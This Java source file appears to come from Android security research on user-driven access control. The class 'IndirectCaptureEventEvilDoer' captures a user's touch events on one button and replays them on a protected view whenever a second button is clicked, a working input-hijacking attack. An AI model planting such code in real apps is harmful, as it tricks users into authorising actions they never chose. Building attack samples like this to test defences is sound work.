package com.example.evildoers.progclicks.complex.event;

import android.app.Activity;
import android.view.MotionEvent;
import android.view.View;
import android.widget.Button;
import com.example.evildoers.progclicks.simple.IndirectClickEvilDoer;

import java.util.LinkedList;
import java.util.Queue;

/**
 * This EvilDoer is super cute: It captures an event from one button, and then plays it back to the ACG as a listener to another button
 */
public class IndirectCaptureEventEvilDoer extends IndirectClickEvilDoer {

    protected int userExposedButtonId2;

    public IndirectCaptureEventEvilDoer(int viewToClickId, int userExposedButtonId, int userExposedButtonId2) {
        super(viewToClickId, userExposedButtonId);
        this.userExposedButtonId2 = userExposedButtonId2;
    }

    @Override
    public void doEvil(final Activity activity) {
        final View viewToClick = getViewToClick(activity);
        final View userExposedView = activity.findViewById(userExposedButtonId);

        /**
         * Set the listener to play events back at the touch of another button
         */
        userExposedView.setOnTouchListener(new StatefulOnTouchListener(activity, viewToClick));
    }

    class StatefulOnTouchListener implements View.OnTouchListener {

        protected final View viewToClick;
        protected final Activity activity;
        protected final View.OnClickListener onClickListener = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!events.isEmpty()) {
                    viewToClick.dispatchTouchEvent(events.remove());
                }
            }
        };
        protected final Button button;
        protected Queue<MotionEvent> events = new LinkedList<>();

        public StatefulOnTouchListener(final Activity activity, final View viewToClick) {
            this.viewToClick = viewToClick;
            this.activity = activity;
            this.button = (Button) activity.findViewById(userExposedButtonId2);
            button.setOnClickListener(onClickListener);
        }

        @Override
        public boolean onTouch(View view, final MotionEvent event) {
            events.add(event);
            return true;
        }

    }
}
